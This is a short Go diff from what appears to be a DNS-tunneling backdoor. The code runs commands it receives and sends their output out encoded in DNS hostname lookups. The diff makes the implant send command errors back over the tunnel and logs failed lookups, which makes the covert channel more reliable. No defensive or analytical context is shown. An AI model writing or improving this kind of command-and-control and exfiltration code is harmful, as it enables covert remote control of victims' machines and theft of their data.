@@ -63,7 +63,7 @@ func handleCommands(commandChan chan string, responseChan chan []byte) {
 			//Exec command
 			stdout, err := cmd.Output()
 			if err != nil {
-				fmt.Println(err)
+				responseChan <- []byte(err.Error())
 			} else {
 				responseChan <- stdout
 			}
@@ -92,7 +92,10 @@ func returnResponses(r *net.Resolver, responseChan chan []byte) {
 		requests := encodeRequests(cmdOutput)
 		for i, request := range requests {
 			fmt.Println(i, " ", request)
-			r.LookupHost(context.Background(), request)
+			_, err := r.LookupHost(context.Background(), request)
+			if err != nil {
+				fmt.Println(err)
+			}
 		}
 	}
 }
@@ -123,8 +126,7 @@ func encodeRequests(cmdOutput []byte) []string {
 			if len(cmdOutput)-i < (32*3 - 2) {
 				bytes[0] = bytes[0] | 128
 			}
-			fmt.Printf("% b", bytes)
-			fmt.Printf("\n")
+			//fmt.Printf("% b", bytes)
 			levelBytes = append(levelBytes, bytes...)
 		}
 		//add the current byte
